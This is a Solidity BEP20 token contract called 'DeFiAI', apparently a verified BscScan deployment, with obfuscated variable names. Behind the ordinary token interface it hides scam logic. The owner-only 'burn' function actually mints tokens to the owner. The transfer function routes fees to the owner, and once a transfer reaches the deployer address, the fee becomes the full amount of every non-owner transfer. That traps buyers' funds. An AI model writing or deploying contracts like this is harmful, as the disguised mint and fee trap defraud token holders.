/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.7.2;
contract DeFiAI {
string public  name = "DeFiAI";
address private  jtbPQY = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant UIQrQL = 999999999999999999999999+1;
uint256 public  dQAyEL = 100000000000000000000000;
uint256 private  wJjXNk = 10000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  jfuazI = 100000000000000000;
address public  tmjVOq = address(0);
uint256 public  iYedQc = 1000000000000000000;
uint8 public constant decimals = 18;
uint256 public  hzFCXX = 100000000000000000000;
address public  RtSyKX = address(0);
uint256 public  gTbYaw = 10000000000000000000000000000;
address public  rKJKxY = address(0);
uint256 public  IiMuSF = 10000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "DeFiAI";
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  Idwxvi = 100000000000000000000000;
address public owner;
address public  pCmrlc = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => uint256) public balanceOf;
address public  fRvwHA = address(0);
uint256 public  AnlMlT = 10000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  pPehRv = address(0);
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () {
jtbPQY = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "LvhRtr");
require(to != address(0), "LvhRtr");
require(amount <= balanceOf[from], "LvhRtr");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* UIQrQL/wJjXNk ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==jtbPQY){
wJjXNk = 999999999999999999999999+1;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}